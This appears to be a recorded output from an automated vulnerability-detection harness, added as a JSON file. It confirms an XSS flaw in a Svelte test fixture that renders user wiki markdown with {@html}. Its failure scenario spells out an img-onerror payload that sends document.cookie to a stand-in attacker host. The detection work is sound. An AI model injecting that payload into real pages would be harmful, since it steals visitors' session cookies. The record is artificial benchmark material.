@@ -1,0 +1,8 @@
+{
+  "key": "f2e934d59e368540323c4d103733692a",
+  "file": "positive/xss/svelte-html-expression.svelte",
+  "model": "default",
+  "raw": "```json\n[\n  {\n    \"vulnSlug\": \"xss\",\n    \"lineNumbers\": [13],\n    \"verdict\": \"confirmed\",\n    \"severity\": \"high\",\n    \"summary\": \"User-authored wiki markdown is rendered with {@html} without sanitization, allowing arbitrary script execution.\",\n    \"rationale\": \"Line 13 uses Svelte's {@html} directive to inject `renderedMarkdown` directly into the DOM. The comment on lines 4-6 explicitly states this is 'server-rendered markdown from a user-authored wiki page, injected with {@html} instead of being escaped or passed through a sanitizer first.' The {@html} directive bypasses all HTML escaping, and since the content originates from user input, any malicious HTML or JavaScript embedded in the wiki page will execute in viewers' browsers.\",\n    \"failureScenario\": \"A malicious user creates a wiki page containing markdown with embedded HTML such as '<img src=x onerror=\\\"fetch(\\\\'https://attacker.com?c=\\\\'+document.cookie)\\\">'. When the markdown is rendered server-side and passed as the renderedMarkdown prop, the {@html} directive on line 13 injects it directly into the DOM without sanitization, causing the onerror handler to execute and exfiltrate the victim's cookies.\",\n    \"confidence\": 0.95\n  }\n]\n```",
+  "recordedAt": "2026-08-12T03:44:37.322Z",
+  "elapsedMs": 19733.745922727274
+}
